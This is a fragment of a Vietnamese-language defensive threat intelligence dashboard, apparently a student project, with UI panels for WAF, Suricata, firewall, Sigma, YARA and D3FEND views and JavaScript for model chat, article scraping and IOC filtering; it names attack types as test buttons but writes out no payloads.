        <div style="display:flex; flex-wrap:wrap; gap:6px; padding:8px 10px; margin-bottom:12px; background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px;">
          <button id="subBtn_subTabWaf" class="CleanBtn EngineSubBtn active btn-primary" onclick="switchEngineSubTab('subTabWaf', this)" style="font-size:12px;">
            1. Vá Ảo Hóa L7 (Virtual Patching)
          </button>
          <button id="subBtn_subTabSuricata" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabSuricata', this)" style="font-size:12px;">
            2. Chữ Ký Kiểm Định Tầng Mạng (DPI Probe)
          </button>
          <button id="subBtn_subTabFirewall" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabFirewall', this)" style="font-size:12px;">
            3. Lệnh Tác Tử Chặn C2 (OpenC2 Action)
          </button>
          <button id="subBtn_subTabSigma" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabSigma', this)" style="font-size:12px;">
            4. Tương Quan Hành Vi TTPs (Sysmon & SIEM)
          </button>
          <button id="subBtn_subTabYara" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabYara', this)" style="font-size:12px;">
            5. Nhận Diện Mã Độc (YARA & EDR)
          </button>
          <button id="subBtn_subTabHistory" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabHistory', this)" style="font-size:12px;">
            6. Ma Trận Phòng Thủ MITRE D3FEND
          </button>
          <button id="subBtn_subTabLiveServer" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabLiveServer', this)" style="font-size:12px;">
            7. Môi Trường Thực Nghiệm (Port 8766)
          </button>
        </div>

        <!-- SUB-PANEL 1: WAF -->
        <div id="subTabWaf" class="EngineSubPanel" style="display:block;">
          <pre id="outWaf">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 2: SURICATA -->
        <div id="subTabSuricata" class="EngineSubPanel" style="display:none;">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <div>
              <span style="font-size:12px; font-weight:700; color:var(--primary); background:var(--primary-subtle); padding:3px 8px; border-radius:4px; border:1px solid #bfdbfe;">
                SURICATA IDS/IPS MASTER DEEP PACKET INSPECTION (DPI)
              </span>
              <span style="font-size:12px; color:var(--text-muted); margin-left:8px;" id="suriFileInfoBadge">
                Tệp: cti_autonomous_master.rules (422 Dòng • 87.8 KB • 11 Cụm C2 • 180 Domain Sinkhole • CVE Virtual Patching)
              </span>
            </div>
            <div style="display:flex; gap:8px;">
              <button class="CleanBtn btn-primary" onclick="validateSuricataRules()">Kiểm Tra Cú Pháp</button>
              <button class="CleanBtn" onclick="testSuricataDpi('c2_flow')">Test DPI C2 Flow</button>
              <button class="CleanBtn" onclick="testSuricataDpi('dns_sinkhole')">Test DNS Sinkhole</button>
              <button class="CleanBtn" onclick="testSuricataDpi('cve_dpi')">Test CVE DPI</button>
            </div>
          </div>
          <pre id="outSuricata" style="max-height:600px; overflow-y:auto; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.45;">Đang tải toàn bộ quy tắc Suricata Master...</pre>
        </div>

        <!-- SUB-PANEL 3: FIREWALL OPENC2 -->
        <div id="subTabFirewall" class="EngineSubPanel" style="display:none;">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <span style="font-size:13px; color:var(--text-main);">Đẩy trực tiếp gói lệnh chuẩn <b>OASIS OpenC2</b> xuống <b>Windows Defender Firewall</b>:</span>
            <div style="display:flex; gap:8px;">
              <button class="CleanBtn btn-primary" id="btnFwApply" onclick="applyWindowsFirewallTool()">Áp Dụng Firewall</button>
              <button class="CleanBtn" id="btnFwStatus" onclick="checkWindowsFirewallStatusTool()">Kiểm Tra Trạng Thái</button>
              <button class="CleanBtn" id="btnFwRollback" style="color:var(--danger); border-color:var(--danger-border);" onclick="rollbackWindowsFirewallTool()">Gỡ Luật Thử Nghiệm</button>
            </div>
          </div>
          <pre id="outFirewall">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 4: SIGMA & SIEM -->
        <div id="subTabSigma" class="EngineSubPanel" style="display:none;">
          <pre id="outSigma">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 5: YARA & EDR -->
        <div id="subTabYara" class="EngineSubPanel" style="display:none;">
          <pre id="outYara">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 6: D3FEND -->
        <div id="subTabHistory" class="EngineSubPanel" style="display:none;">
          <pre id="outHistory">Đang chờ tổng hợp chiến lược phòng thủ...</pre>
        </div>

        <!-- SUB-PANEL 7: LIVE SERVER -->
        <div id="subTabLiveServer" class="EngineSubPanel" style="display:none;">
          <!-- HEADER TRẠNG THÁI MÁY CHỦ -->
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:12px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
              <span style="font-size:11.5px; font-weight:700; padding:3px 8px; background:var(--safe-bg); color:var(--safe); border:1px solid var(--safe-border); border-radius:4px;">
                MÁY CHỦ WAF REVERSE PROXY: CỔNG 8766 (RUNNING LIVE)
              </span>
              <span style="font-size:11.5px; font-weight:700; padding:3px 8px; background:var(--primary-subtle); color:var(--primary); border:1px solid #bfdbfe; border-radius:4px;">
                <span id="lblCorpusStats1">KHO TRI THỨC PHÂN HỆ: 221 BÀI BÁO &amp; 1,828 IOCs (2024 - 2026)</span>
              </span>
            </div>
            <div>
              <button class="CleanBtn btn-primary" onclick="recompileAllDefenseEngines()" style="font-size:12px;">Đồng Bộ &amp; Tái Biên Dịch Rule (Hot-Reload)</button>
            </div>
          </div>

          <!-- 5 ENGINE PHÒNG THỦ LIVE TRÊN HỆ THỐNG -->
          <div style="margin-bottom:14px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:8px; text-transform:uppercase; letter-spacing:0.04em;">
              TÌNH TRẠNG 5 ENGINE PHÒNG THỦ ĐÃ BIÊN DỊCH VÀ SẴN SÀNG THỰC CHIẾN:
            </div>
            <div id="liveEnginesGrid" style="display:grid; grid-template-columns:repeat(auto-fit, minmax(230px, 1fr)); gap:10px;">
              <!-- Render động bằng JS -->
            </div>
          </div>
        </div>

        <!-- BẢNG THỬ NGHIỆM TẤN CÔNG THỰC TẾ LÊN WAF PROXY CỔNG 8766 -->
        <div style="border:1px solid var(--border-main); border-radius:6px; padding:14px; margin-bottom:14px; background:var(--bg-card);">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px;">
            <div>
              <b style="font-size:13.5px; color:var(--text-main);">CONSOLE THỬ NGHIỆM TẤN CÔNG WAF THỰC TẾ (PORT 8766)</b>
              <div style="font-size:12px; color:var(--text-muted);">
                Bắn gói tin trực tiếp vào máy chủ WAF để kiểm tra khả năng bắt payload L7 (RCE, SQLi, Path Traversal, JNDI) và trả về HTTP 403 Forbidden.
              </div>
            </div>
            <div style="display:flex; gap:6px; flex-wrap:wrap;">
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('sqli')">Thử SQL Injection</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('traversal')">Thử Path Traversal</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('rce')">Thử RCE / Command Injection</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('jndi')">Thử Log4Shell JNDI</button>
              <button class="CleanBtn" style="color:var(--safe); border-color:var(--safe-border); font-size:12px;" onclick="testWafAttack('clean')">Thử Gói Tin Hợp Lệ (200 OK)</button>
            </div>
          </div>

          <pre id="wafLiveConsole" style="background:#0a0a0a; color:#33ff00; padding:12px; border-radius:4px; font-family:'JetBrains Mono',monospace; font-size:12px; max-height:220px; overflow-y:auto; white-space:pre-wrap; margin-bottom:12px;">[WAF PROXY READY] Sẵn sàng nhận gói tin kiểm thử trên cổng 8766. Nhấn một trong các nút kiểm thử phía trên để kích hoạt mô phỏng tấn công thời gian thực.</pre>

          <!-- BẢNG NHẬT KÝ ĐÁNH CHẶN GẦN ĐÂY -->
          <div style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase;">
            NHẬT KÝ ĐÁNH CHẶN THỜI GIAN THỰC (REAL-TIME INTERCEPTION AUDIT LOG):
          </div>
          <div style="max-height:160px; overflow-y:auto; border:1px solid var(--border-main); border-radius:4px;">
            <table style="width:100%; border-collapse:collapse; font-size:12px;">
              <thead>
                <tr style="background:var(--bg-subtle); text-align:left; border-bottom:1px solid var(--border-main);">
                  <th style="padding:6px 8px;">Thời Gian</th>
                  <th style="padding:6px 8px;">IP Nguồn</th>
                  <th style="padding:6px 8px;">Method</th>
                  <th style="padding:6px 8px;">URL / Payload</th>
                  <th style="padding:6px 8px;">Kỹ Thuật Phát Hiện</th>
                  <th style="padding:6px 8px;">Hành Động</th>
                </tr>
              </thead>
              <tbody id="wafAttackLogsBody">
                <tr><td colspan="6" style="padding:10px; text-align:center; color:var(--text-muted);">Đang tải nhật ký...</td></tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- PHÂN TÍCH KHO TRI THỨC 3 NĂM & LUẬN ĐIỂM HỌC THUẬT CHO GIẢNG VIÊN -->
        <div style="border:1px solid var(--border-main); border-radius:6px; padding:14px; background:var(--bg-subtle);">
          <b style="font-size:13.5px; color:var(--text-main);">PHÂN BỐ DỮ LIỆU CTI 3 NĂM (2024 - 2026) &amp; MÔ HÌNH KIM TỰ THÁP PYRAMID OF PAIN</b>
          <p style="font-size:12.5px; color:var(--text-muted); margin-top:4px; margin-bottom:12px;">
            Cơ sở dữ liệu bao phủ 7,258 bài báo và hồ sơ lỗ hổng bảo mật zero-day nghiêm trọng trong 3 năm liên tiếp (2024 - 2026), chứng minh giải pháp phòng thủ của đồ án vượt xa việc chỉ chặn địa chỉ IP truyền thống.
          </p>

          <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:10px; margin-bottom:14px;">
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2024</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2024">1,948</div>
              <div style="font-size:11px; color:var(--text-muted);">Ivanti, Palo Alto, XZ-Utils, ScreenConnect</div>
            </div>
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2025</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2025">2,094</div>
              <div style="font-size:11px; color:var(--text-muted);">CitrixBleed v2, ActiveMQ, AI Injection</div>
            </div>
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2026</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2026">3,087</div>
              <div style="font-size:11px; color:var(--text-muted);">CISA KEV Catalog, APTs &amp; Zero-Days</div>
            </div>
            <div style="background:#ffffff; border:1px solid #bfdbfe; border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--primary);">TỔNG CỘNG 3 NĂM</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYearTotal">7,258</div>
              <div style="font-size:11px; color:var(--text-muted);">Hồ sơ CTI &amp; CVE toàn diện</div>
            </div>
          </div>

          <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:12px; font-size:12.5px; line-height:1.6;">
            <b style="color:var(--text-main);">LUẬN ĐIỂM BẢO VỆ ĐỒ ÁN VỀ BỘ KỸ NĂNG TÁC TỬ (AGENTIC SKILLS OVER STATIC RULES):</b><br/>
            1. <b>Chuyển dịch từ sinh luật tĩnh (Rules) sang Kỹ năng Tác tử tự hành (Agentic Skills):</b> Thay vì sinh ra các dòng rule tĩnh rời rạc khó đồng bộ và dễ xung đột, hệ thống đóng gói tri thức CTI thành các gói Kỹ Năng Tác Tử hoàn chỉnh (bao gồm quy trình SOP, kịch bản probe kiểm chứng, và các cặp mã refactor đa ngôn ngữ).<br/>
            2. <b>Tác tử tự động kiểm chứng True Positive &amp; Zero False Positive:</b> Tác tử sử dụng kịch bản kiểm thử (<code>scripts/verify_exploit.py</code>) để tự động bắn gói tin mô phỏng và thẩm định tính khả thi trên hệ thống thực tế trước khi đề xuất vá mã nguồn.<br/>
            3. <b>Phối hợp vá ảo và sửa mã nguồn tận gốc:</b> Trong lúc AI Agent hoặc lập trình viên tiến hành refactor mã nguồn theo SOP an toàn, công cụ vá ảo hóa (<code>scripts/apply_virtual_patch.py</code>) lập tức kích hoạt để bảo vệ ứng dụng ở tầng L7 mà không gây gián đoạn dịch vụ.
          </div>
        </div>
      </div>
      </div>

        
</section>

    

  </div>

  <script>
    let articles = [];
    let allHistoryArticles = [];
    let historySortMode = "RECENT_DONE";
    let selectedHistoryIds = new Set();
    let historyViewMode = 'PROJECT';
    let globalArchiveArticles = [];

    async function switchHistoryScopeMode(mode, btnEl) {
      historyViewMode = mode;
      const btnProj = document.getElementById('btnHistModeProject');
      const btnAll = document.getElementById('btnHistModeAll');
      if (btnProj) btnProj.classList.remove('active');
      if (btnAll) btnAll.classList.remove('active');
      if (btnEl) btnEl.classList.add('active');

      if (mode === 'GLOBAL' && globalArchiveArticles.length === 0) {
        try {
          const res = await fetch('/api/articles?source=ALL');
          globalArchiveArticles = await res.json();
        } catch (e) {
          console.error("Lỗi nạp toàn bộ kho CTI:", e);
        }
      }
      renderHistoryManager();
    }
    let selectedIndices = [];
    let currentTitle = "";
    let currentFilter = "ALL";
    let remainingSeconds = 60;
    let timerInterval = null;
    let iocProvenanceMap = {};
    let articleDefenseCache = {};

    let webChatHistory = [];

    function switchView(sectionId, btnEl) {
      document.querySelectorAll('.NavLinks .NavLink').forEach(b => {
        b.classList.remove('active');
        b.style.background = '';
        b.style.color = '';
        b.style.borderColor = '';
      });
      if (btnEl) {
        btnEl.classList.add('active');
        btnEl.style.background = '#2563eb';
        btnEl.style.color = '#ffffff';
        btnEl.style.borderColor = '#1d4ed8';
      }

      const wiz = document.getElementById('sec-wizard');
      const chat = document.getElementById('sec-chat');
      const add = document.getElementById('sec-add');
      const feed = document.getElementById('sec-feed');
      const hist = document.getElementById('sec-history');
      const score = document.getElementById('sec-score');
      const defense = document.getElementById('sec-defense');

      if (sectionId === 'sec-wizard') {
        if (wiz) wiz.style.display = 'block';
        if (chat) chat.style.display = 'none';
        if (add) add.style.display = 'none';
        if (feed) feed.style.display = 'none';
        if (hist) hist.style.display = 'none';
        if (score) score.style.display = 'none';
        if (defense) defense.style.display = 'none';

        if (!wzIsProjectConfigured && wzCurrentStep === 0) {
          wizardGotoStep(0);
        } else if (wzIsProjectConfigured && (wzCurrentStep === 0 || !wzCurrentStep)) {
          wizardGotoStep(1);
        } else {
          wizardGotoStep(wzCurrentStep || 1);
        }
        if (wiz) wiz.scrollIntoView({ behavior: 'smooth', block: 'start' });
      } else if (sectionId === 'all') {
        if (chat) chat.style.display = 'none';
        if (add) add.style.display = 'none';
        if (wiz) {
          wiz.style.display = wzIsProjectConfigured ? 'none' : 'block';
          if (!wzIsProjectConfigured && wzCurrentStep === 0) wizardGotoStep(0);
        }
        if (feed) feed.style.display = 'block';
        if (hist) hist.style.display = 'block';
        if (score) score.style.display = 'block';
        if (defense) defense.style.display = 'block';
      } else if (sectionId === 'sec-chat') {
        const ids = [wiz, add, feed, hist, score, defense];
        ids.forEach(el => { if (el) el.style.display = 'none'; });
        if (chat) {
          chat.style.display = 'block';
          chat.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      } else if (sectionId === 'sec-add') {
        const ids = [wiz, chat, feed, hist, score, defense];
        ids.forEach(el => { if (el) el.style.display = 'none'; });
        if (add) {
          add.style.display = 'block';
          add.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      } else {
        // sec-feed, sec-history, sec-score, sec-defense
        if (chat) chat.style.display = 'none';
        if (add) add.style.display = 'none';
        if (wiz) wiz.style.display = 'none';

        const liveMap = {'sec-feed': feed, 'sec-history': hist, 'sec-score': score, 'sec-defense': defense};
        Object.keys(liveMap).forEach(k => {
          const el = liveMap[k];
          if (el) el.style.display = (k === sectionId) ? 'block' : 'none';
        });
        const targetEl = document.getElementById(sectionId);
        if (targetEl) targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }

    let detectedSystemHardware = null;

    async function loadHardwareAndModels() {
      try {
        const res = await fetch('/api/system/hardware-info');
        if (res.ok) {
          const data = await res.json();
          detectedSystemHardware = data.hardware;
          detectedSystemModelData = data;
          const sel = document.getElementById('aiModelSelect');
          const badge = document.getElementById('localModelBadge');
          const chatLegend = document.getElementById('chatBoxLegend');

          // Cập nhật thông tin phần cứng lên Landing Card Step 0
          if (data.hardware) {
            const wzGpu = document.getElementById('wzGpuText');
            const wzCpu = document.getElementById('wzCpuText');
            const wzRam = document.getElementById('wzRamText');
            const wzTier = document.getElementById('wzHardwareSummaryTag');
            if (wzGpu) wzGpu.textContent = data.hardware.gpu_name + (data.hardware.vram_gb ? ' (' + data.hardware.vram_gb + 'GB VRAM)' : '');
            if (wzCpu) wzCpu.textContent = data.hardware.cpu_name || 'CPU Đa Nhân';
            if (wzRam) wzRam.textContent = (data.hardware.ram_gb || 16.0) + ' GB';
            if (wzTier) wzTier.textContent = (data.hardware.tier_title || 'CẤU HÌNH TIÊU CHUẨN').toUpperCase();
          }
          
          if (chatLegend && data.hardware) {
            chatLegend.textContent = `TRỢ LÝ AI AGENT (${data.hardware.gpu_name.toUpperCase()})`;
          }

          if (sel && data.options && data.options.length > 0) {
            sel.innerHTML = '';
            let savedModel = null;
            try {
              savedModel = localStorage.getItem('selectedAiModel');
            } catch (e) {}

            // Neu du an chua duoc cau hinh (dang o Buoc 0 khoi dau), khong tu y chot model truoc
            if (!wzIsProjectConfigured && !savedModel) {
              const pendingOpt = document.createElement('option');
              pendingOpt.value = 'pending';
              pendingOpt.textContent = 'Chờ khảo sát phần cứng (Chọn ở Bước 2)...';
              pendingOpt.selected = true;
              sel.appendChild(pendingOpt);
            }

            let matched = false;
            data.options.forEach(opt => {
              const optEl = document.createElement('option');
              optEl.value = opt.value;
              optEl.textContent = opt.label;
              if (savedModel && opt.value === savedModel) {
                optEl.selected = true;
                matched = true;
              } else if (wzIsProjectConfigured && !savedModel && opt.is_active) {
                optEl.selected = true;
                matched = true;
              }
              sel.appendChild(optEl);
            });
          }
          
          if (badge && data.hardware) {
            if (!wzIsProjectConfigured && !localStorage.getItem('selectedAiModel')) {
              badge.textContent = `PHẦN CỨNG: ${data.hardware.gpu_name.toUpperCase()} (${data.hardware.vram_gb || 8}GB VRAM) • CHỜ KHẢO SÁT MODEL Ở BƯỚC 2`;
            } else {
              const activeVal = sel ? sel.value : data.active_model;
              updateModelBadgeText(activeVal);
            }
          }
        }
      } catch (e) {
        console.error("Không thể lấy thông tin phần cứng:", e);
      }
    }

    function updateModelBadgeText(modelVal) {
      const badge = document.getElementById('localModelBadge');
      if (!badge) return;
      const hw = detectedSystemHardware || { gpu_name: "AMD Radeon RX 6600", vram_gb: 8.0, is_gpu_available: true };
      if (!modelVal || modelVal === 'cti-heuristic-engine') {
        badge.textContent = `CTI HEURISTIC CORE (${hw.gpu_name.toUpperCase()} • NHẸ)`;
      } else {
        badge.textContent = `TÁC TỬ: ${modelVal.toUpperCase()} (${hw.gpu_name.toUpperCase()} • ${hw.vram_gb}GB VRAM • SẴN SÀNG)`;
      }
    }

    function onAiModelChange() {
      const sel = document.getElementById('aiModelSelect');
      const val = sel ? sel.value : 'qwen2.5:7b';
      try {
        localStorage.setItem('selectedAiModel', val);
      } catch (e) {}
      updateModelBadgeText(val);
      updateLiveTicker(`Đã chuyển sang mô hình: ${val} (${detectedSystemHardware ? detectedSystemHardware.gpu_name : 'GPU Cục Bộ'})`);
    }

    function quickFillChat(text) {
      const inp = document.getElementById('webChatInput');
      if (inp) {
        inp.value = text;
        sendWebChatMessage();
      }
    }

    async function sendWebChatMessage() {
      const inp = document.getElementById('webChatInput');
      const btn = document.getElementById('btnSendChat');
      const logBox = document.getElementById('chatLogBox');
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-qwen3';
      const msg = inp.value.trim();
      if (!msg) return;

      inp.value = "";
      btn.disabled = true;
      btn.textContent = "Đang suy luận...";

      const safeUser = msg.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      const pendingId = 'pending-' + Date.now();
      logBox.innerHTML += `
        <div style="padding:10px 14px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px; align-self:flex-end; max-width:88%; box-shadow:0 1px 2px rgba(0,0,0,0.04);">
          <b style="color:var(--text-main);">Khang:</b><br/>${safeUser}
        </div>
        <div id="${pendingId}" style="padding:10px 14px; border-left:3px solid var(--primary); background:var(--bg-subtle); border-radius:0 6px 6px 0; border:1px solid var(--border-main); color:var(--text-muted); font-size:12.5px;">
          <b style="color:var(--primary);">OpenClaw AI Agent (${selectedModel}):</b><br/>
          Đang kích hoạt Tool-calling và suy luận trên ${detectedSystemHardware ? detectedSystemHardware.gpu_name : 'phần cứng cục bộ'}...
        </div>
      `;
      logBox.scrollTop = logBox.scrollHeight;

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 40000);

      try {
        const res = await fetch('/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: msg,
            model_name: selectedModel,
            history: webChatHistory
          }),
          signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await res.json();
        document.getElementById(pendingId)?.remove();
        webChatHistory = data.history || [];
        const safeAi = (data.reply || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br/>');
        const toolHtml = data.tool_summary
          ? `<div class="mono" style="font-size:11.5px; color:var(--primary); margin-bottom:8px; padding-bottom:8px; border-bottom:1px dashed var(--border-main); line-height:1.5;">${data.tool_summary.replace(/\n/g, '<br/>')}</div>`
          : '';
        logBox.innerHTML += `
          <div style="padding:12px 16px; border-left:3px solid var(--primary); background:#ffffff; border-radius:0 6px 6px 0; border:1px solid var(--border-main); border-left:3px solid var(--primary); box-shadow:0 1px 2px rgba(0,0,0,0.02);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
              <b style="color:var(--primary); font-size:13px;">OpenClaw AI Agent:</b>
              <span class="mono" style="font-size:11px; color:var(--text-muted); background:var(--bg-subtle); padding:2px 6px; border-radius:4px; border:1px solid var(--border-main);">${data.model_used}</span>
            </div>
            ${toolHtml}
            <div style="color:var(--text-main); font-size:13px; line-height:1.6;">${safeAi}</div>
          </div>
        `;
        logBox.scrollTop = logBox.scrollHeight;
      } catch (e) {
        clearTimeout(timeoutId);
        document.getElementById(pendingId)?.remove();
        let errMsg = e.name === 'AbortError'
          ? "Thời gian xử lý của mô hình vượt quá 40s. Đề xuất: Chọn model 'Qwen 2.5 1.5B Turbo' trên thanh menu để nhận phản hồi siêu tốc dưới 2 giây."
          : "Không thể kết nối đến máy chủ API: " + e;
        logBox.innerHTML += `<div style="color:var(--danger); padding:10px 14px; background:var(--danger-bg); border-radius:6px; font-size:12.5px; border:1px solid #fca5a5;">${errMsg}</div>`;
      } finally {
        btn.disabled = false;
        btn.textContent = "Gửi Câu Hỏi";
      }
    }

    function toggleManualBox() {
      switchView('sec-add');
    }

    async function addArticleFromUrl() {
      const urlInput = document.getElementById('newArticleUrlInput');
      const btn = document.getElementById('btnAddUrl');
      const rawUrl = urlInput.value.trim();
      if (!rawUrl) {
        alert("Vui lòng dán URL bài báo cần thêm!");
        return;
      }
      btn.disabled = true;
      btn.textContent = "Đang cào...";
      try {
        const res = await fetch('/api/articles/add', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: rawUrl, title: "", content: "" })
        });
        const data = await res.json();
        urlInput.value = "";
        articles = data.articles || [];
        renderSourceWebsites();
        renderNewsGrid();
        switchView('all', document.querySelector('.NavLinks .NavLink'));
        selectCard(0, true);
      } catch (e) {
        alert("Lỗi thêm URL: " + e);
      } finally {
        btn.disabled = false;
        btn.textContent = "Cào Dữ Liệu URL";
      }
    }

    async function addManualArticle() {
      const title = document.getElementById('manualTitleInput').value.trim();
      const url = document.getElementById('manualSourceUrlInput').value.trim() || "https://thehackernews.com";
      const content = document.getElementById('manualContentInput').value.trim();
      if (!content && !url) {
        alert("Vui lòng nhập nội dung bài báo hoặc URL!");
        return;
      }
      const res = await fetch('/api/articles/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: url, title: title, content: content })
      });
      const data = await res.json();
      document.getElementById('manualTitleInput').value = "";
      document.getElementById('manualContentInput').value = "";
      articles = data.articles || [];
      renderSourceWebsites();
      renderNewsGrid();
      switchView('all', document.querySelector('.NavLinks .NavLink'));
      selectCard(0, true);
    }

    function renderSourceWebsites() {
      const baseSites = [
        { host: "thehackernews.com", url: "https://thehackernews.com" },
        { host: "bleepingcomputer.com", url: "https://www.bleepingcomputer.com" },
        { host: "cisa.gov", url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog" },
        { host: "threatfox.abuse.ch", url: "https://threatfox.abuse.ch" },
        { host: "securityweek.com", url: "https://www.securityweek.com" },
        { host: "research.checkpoint.com", url: "https://research.checkpoint.com" },
        { host: "securelist.com", url: "https://securelist.com" },
        { host: "thedfirreport.com", url: "https://thedfirreport.com" }
      ];
      const box = document.getElementById('sourceWebsitesList');
      if (box) {
        box.innerHTML = baseSites.map(s =>
          `<a class="BtnMiniProof" href="${s.url}" target="_blank">${s.host} &nearr;</a>`
        ).join('');
      }
    }

    function setStageState(stageNum, state, metaText, summaryMsg, pct) {
      if (pct !== null) {
        document.getElementById('progressPercentText').textContent = pct + '%';
      }
    }

    function formatTimeOnly(raw) {
      if (!raw) return '';
      const s = String(raw).trim();
      let d;
      if (s.endsWith('Z') || s.includes('+') || (s.includes('T') && !s.includes(' '))) {
        d = new Date(s);
      } else if (/^\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}/.test(s)) {
        return s.slice(11, 19);
      } else {
        d = new Date(s);
      }
      if (d && !isNaN(d.getTime())) {
        const pad = (n) => String(n).padStart(2, '0');
        return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
      }
      return s.slice(11, 19) || s;
    }

    function formatToLocalTime(raw) {
      if (!raw) return '--';
      const s = String(raw).trim();
      let d;
      if (s.endsWith('Z') || s.includes('+') || (s.includes('T') && !s.includes(' '))) {
        d = new Date(s);
      } else if (/^\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}/.test(s)) {
        return s.slice(0, 16);
      } else {
        d = new Date(s);
      }
      if (!d || isNaN(d.getTime())) {
        return s.slice(0, 16);
      }
      const pad = (n) => String(n).padStart(2, '0');
      const yr = d.getFullYear();
      const mo = pad(d.getMonth() + 1);
      const da = pad(d.getDate());
      const hr = pad(d.getHours());
      const mi = pad(d.getMinutes());
      return `${yr}-${mo}-${da} ${hr}:${mi}`;
    }

    function cleanRefang(val) {
      return (val || '').replace(/\[\.\]/g, '.').replace(/\(\.\)/g, '.').trim();
    }

    function domSafeId(val) {
      return 'ioc-hl-' + cleanRefang(val).replace(/[^a-zA-Z0-9]/g, '_');
    }

    function isValidIpv4Token(rawIp, fullText = '', matchIndex = -1) {
      const s = (rawIp || '').trim();
      const clean = cleanRefang(s);

      // Loai bo tuyet doi Loopback (127.0.0.0/8), 0.0.0.0/8, Broadcast va Link-local (169.254.0.0/16)
      if (clean.startsWith('127.') || clean.startsWith('0.') || clean.startsWith('169.254.') || clean === '255.255.255.255') {
        return false;
      }

      if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'].includes(clean)) return true;

      if (fullText && matchIndex >= 0) {
        const after = fullText.slice(matchIndex + rawIp.length, matchIndex + rawIp.length + 15);
        if (/^-[a-zA-Z0-9]/.test(after)) return false;
        const before = fullText.slice(Math.max(0, matchIndex - 30), matchIndex).toLowerCase();
        if (/\b(v8|version|ver|build|node|kernel|release|runtime|v)\s*(to|:|of|=)?\s*$/.test(before)) return false;
      }

      const parts = clean.split('.').map(Number);
      if (parts.length !== 4 || parts.some(isNaN)) return false;
      if (parts[0] === 0) return false;
      if (Math.max(...parts) < 32 && !s.includes('[.]') && !s.includes('(.)')) return false;
      return true;
    }

    function isBenignOrProtectedIoc(rawVal) {
      const c = cleanRefang(rawVal).toLowerCase();
      if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '127.0.0.1', '0.0.0.0', '169.254.169.254', '3.112.252.14', '221.216.140.49', '221.216.140.129', '84.32.84.32'].includes(c)) {
        return true;
      }
      if (c.startsWith('10.') || c.startsWith('192.168.') || c.startsWith('127.')) {
        return true;
      }
      if (['google.com', 'github.com', 'microsoft.com', 'cloudflare.com', 'icloud.com', 'caldav.icloud.com'].some(d => c === d || c.endsWith('.' + d))) {
        return true;
      }
      return false;
    }

